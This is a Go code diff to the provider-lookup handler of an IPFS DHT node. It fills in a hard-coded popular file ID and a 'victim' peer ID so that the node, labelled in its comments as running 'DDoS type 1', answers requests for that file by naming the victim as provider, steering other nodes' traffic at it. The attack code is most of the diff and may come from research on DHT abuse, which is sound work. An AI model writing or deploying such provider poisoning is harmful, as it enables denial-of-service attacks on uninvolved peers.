@@ -308,15 +308,16 @@ func (dht *IpfsDHT) handleGetProviders(ctx context.Context, p peer.ID, pmes *pb.
 	defer logger.Debugf("%s end", reqDesc)
 
 	// setup providers
-	providers := make([]peer.ID, 1)
+	providers := []peer.ID{}
 	ddosType := 1
 
 	if ddosType == 1 {
 		// DDoS type 1: return peer ID to be attacked (only works with active IPFS nodes)
-		popularFileID := ""
+		popularFileID := "QmdmQXB2mzChmMeKY47C43LxUdg1NDJ5MWcKMKxDu7RgQm"
 
 		if c.String() == popularFileID {
-			ddosVictim := peer.ID("insertIDhere")
+			logger.Info("!!! Popular file requested. Responding with Victim ID. !!!")
+			ddosVictim, _ := peer.IDB58Decode("QmQXX1xA8SR587HpgFurMRDXGCdsADjqbTEeWqoATGM1vk")
 			providers = append(providers, ddosVictim)
 		}
 	} else {
@@ -343,7 +344,7 @@ func (dht *IpfsDHT) handleGetProviders(ctx context.Context, p peer.ID, pmes *pb.
 			infos = pstore.PeerInfos(dht.peerstore, providers)
 		}
 		resp.ProviderPeers = pb.PeerInfosToPBPeers(dht.host.Network(), infos)
-		logger.Debugf("%s have %d providers: %s", reqDesc, len(providers), infos)
+		logger.Infof("%s have %d providers: %s", reqDesc, len(providers), infos)
 	}
 
 	// Also send closer peers.
